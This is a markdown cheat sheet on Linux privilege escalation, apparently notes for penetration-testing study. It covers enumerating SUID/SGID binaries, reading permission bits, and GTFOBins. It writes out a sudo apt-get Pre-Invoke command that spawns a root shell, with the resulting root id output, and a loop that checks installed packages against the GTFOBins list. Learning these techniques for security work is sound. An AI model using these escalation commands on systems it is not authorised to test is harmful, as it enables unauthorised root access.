# Special Permissions & GTFOBins CheatSheet

| Command                                                                                                                                                                | Use                                      |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`                                                                                                        | Find SUID binaries owned by root         |
| `find / -uid 0 -perm -6000 -type f 2>/dev/null`                                                                                                                        | Find files with SUID/SGID bits           |
| `find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null`                                                                                                        | Detailed listing of SUID + SGID files    |
| `sudo -l`                                                                                                                                                              | Check sudo permissions                   |
| `echo $PATH`                                                                                                                                                           | View PATH variable                       |
| `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`                                                                                                             | Spawn root shell using GTFOBins trick    |

# SUID (Set User ID)

## Meaning

- Allows a file to run as file owner.
    
- Mostly owner is `root`.
    
- User gets temporary root privileges while executing binary.
    

---

# SUID Permission Format

## Example

```bash
-rwsr-xr-x
```

## Breakdown

|Part|Meaning|
|---|---|
|`rws`|Owner permissions with SUID|
|`r-x`|Group permissions|
|`r-x`|Others permissions|

---

# Lowercase vs Uppercase S

## Lowercase `s`

```bash
-rwsr-xr-x
```

- Execute bit enabled
    
- SUID active
    

---

## Uppercase `S`

```bash
-rwSr--r--
```

- Execute bit missing
    
- SUID not working
    

---

# Example SUID Binary

```bash
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
```

### Meaning

- Owned by root
    
- Executes as root
    
- Any allowed user can get elevated privileges
    

---

# Common SUID Binaries

|Binary|Purpose|
|---|---|
|`/usr/bin/sudo`|Execute commands as root|
|`/bin/su`|Switch user|
|`/usr/bin/passwd`|Change password|
|`/usr/bin/pkexec`|Execute commands as another user|
|`/bin/ping`|ICMP/raw socket access|
|`/bin/mount`|Mount filesystems|
|`/usr/bin/screen-4.5.0`|Old exploitable version|

---

# SGID (Set Group ID)

## Meaning

- File executes with owner's group permissions.
    
- Gives temporary group privileges.
    

---

# SGID Example

```bash
-rwsr-sr-x
```

|Part|Meaning|
|---|---|
|First `s`|SUID|
|Second `s`|SGID|

---

# Permission Numbers

|Value|Meaning|
|---|---|
|`4000`|SUID|
|`2000`|SGID|
|`6000`|SUID + SGID|

---


## Command

```bash
ls -ldb <file>
```

|Option|Meaning|
|---|---|
|`-l`|Long listing|
|`-d`|Show directory/file itself|
|`-b`|Escape special characters|

---

# Why `-d` Is Important

Without `-d`

```bash
ls -l /tmp
```

- Lists contents of `/tmp`
    

With `-d`

```bash
ls -ld /tmp
```

- Shows `/tmp` permissions itself

# GTFOBins

## Meaning

Collection of binaries useful for:

- Shell escape
    
- Reverse shell
    
- File read/write

# apt-get GTFOBins Exploit

## Command

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

---

# Breakdown

|Part|Meaning|
|---|---|
|`sudo`|Run as root|
|`apt-get update`|Update package list|
|`-o`|Set temporary option|
|`APT::Update::Pre-Invoke::=`|Run command before update|
|`/bin/sh`|Spawn shell|

---

# Result

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Meaning:

- Root shell obtained.

# GTFOBins Enumeration

## Command

```bash
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
```

---

# What It Does

|Part|Meaning|
|---|---|
|`curl -s`|Download GTFOBins list|
|`jq`|Parse JSON|
|`keys[]`|Get executable names|
|`grep -q`|Check installed packages|
|`echo`|Print matching binaries|
